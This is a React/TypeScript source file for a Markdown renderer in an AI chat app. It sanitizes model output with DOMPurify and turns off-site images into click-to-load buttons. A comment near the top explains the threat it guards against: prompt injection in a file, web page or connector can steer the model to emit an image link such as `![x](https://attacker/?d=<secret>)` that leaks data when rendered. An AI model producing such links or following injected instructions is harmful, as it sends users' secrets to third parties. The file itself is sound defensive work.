import DOMPurify, { type Config } from 'dompurify'
import { marked } from 'marked'
import { useMemo, useState } from 'react'
import { t, useLang } from '../i18n'
import { allowedImageSrc } from '../logic'

marked.setOptions({ gfm: true, breaks: false })

/*
 * Model output is untrusted (a prompt injection in a file, a web page or a connector can steer it). Rendering it must
 * not make the browser fetch anything by itself: `![x](https://attacker/?d=<secret>)` would send data out with no
 * approval in any permission mode. So only this app's own URLs and inline data load automatically; other images
 * become a placeholder the user can click to load (no Referer). Inline styles (`url()`), <style>, media tags,
 * srcset and SVG are removed for the same reason (and so an answer can't restyle the app).
 */
const PURIFY: Config = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style', 'link', 'meta', 'base', 'iframe', 'frame', 'object', 'embed', 'audio', 'video', 'source', 'track', 'picture', 'form'],
  FORBID_ATTR: ['style', 'srcset', 'poster', 'background', 'ping', 'formaction', 'action', 'lowsrc', 'dynsrc'],
}

// URLs the user chose to load in this session
const approved = new Set<string>()
// set only during one (synchronous) sanitize call, read by the hook
let blocked: { src: string; alt: string }[] | null = null

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (!blocked || !(node instanceof Element) || !node.hasAttribute('src')) return
  const src = node.getAttribute('src') ?? ''
  if (approved.has(src) && node.tagName === 'IMG') {
    node.setAttribute('referrerpolicy', 'no-referrer')
    return
  }
  if (allowedImageSrc(src, location.href)) return
  node.removeAttribute('src')
  if (node.tagName === 'IMG') {
    node.setAttribute('data-nesi-blocked', String(blocked.length))
    blocked.push({ src, alt: node.getAttribute('alt') ?? '' })
  }
})

function render(text: string): string {
  blocked = []
  try {
    const frag = DOMPurify.sanitize(marked.parse(text || '', { async: false }) as string, { ...PURIFY, RETURN_DOM_FRAGMENT: true })
    const list = blocked
    // swap each blocked <img> for a button (built here, after sanitizing, in the inert parsing document)
    frag.querySelectorAll('img[data-nesi-blocked]').forEach((img) => {
      const item = list[Number(img.getAttribute('data-nesi-blocked'))]
      if (!item) return img.remove()
      const doc = img.ownerDocument
      const btn = doc.createElement('button')
      btn.type = 'button'
      btn.className = 'md-img-blocked'
      btn.setAttribute('data-src', item.src)
      let host = item.src
      try {
        host = new URL(item.src, location.href).host || item.src
      } catch {
        /* keep the raw text */
      }
      btn.title = `${t('Imagen de otro sitio, no cargada para no enviarle datos sin permiso. Pulsa para cargarla:')}\n${item.src}`
      btn.textContent = `🖼 ${item.alt ? `${item.alt} · ` : ''}${host} — ${t('pulsa para cargar la imagen')}`
      img.replaceWith(btn)
    })
    const box = frag.ownerDocument.createElement('div')
    box.appendChild(frag)
    return box.innerHTML
  } finally {
    blocked = null
  }
}

export default function Markdown({ text }: { text: string }) {
  const [lang] = useLang()
  const [loaded, setLoaded] = useState(0) // bumps when the user approves an image
  const html = useMemo(() => render(text), [text, loaded, lang]) // eslint-disable-line react-hooks/exhaustive-deps
  return (
    <div
      className="md"
      dangerouslySetInnerHTML={{ __html: html }}
      onClick={(e) => {
        const btn = (e.target as HTMLElement).closest?.('button.md-img-blocked')
        const src = btn?.getAttribute('data-src')
        if (!src) return
        e.preventDefault() // an image inside a link: load it, don't follow the link
        approved.add(src)
        setLoaded((n) => n + 1)
      }}
    />
  )
}
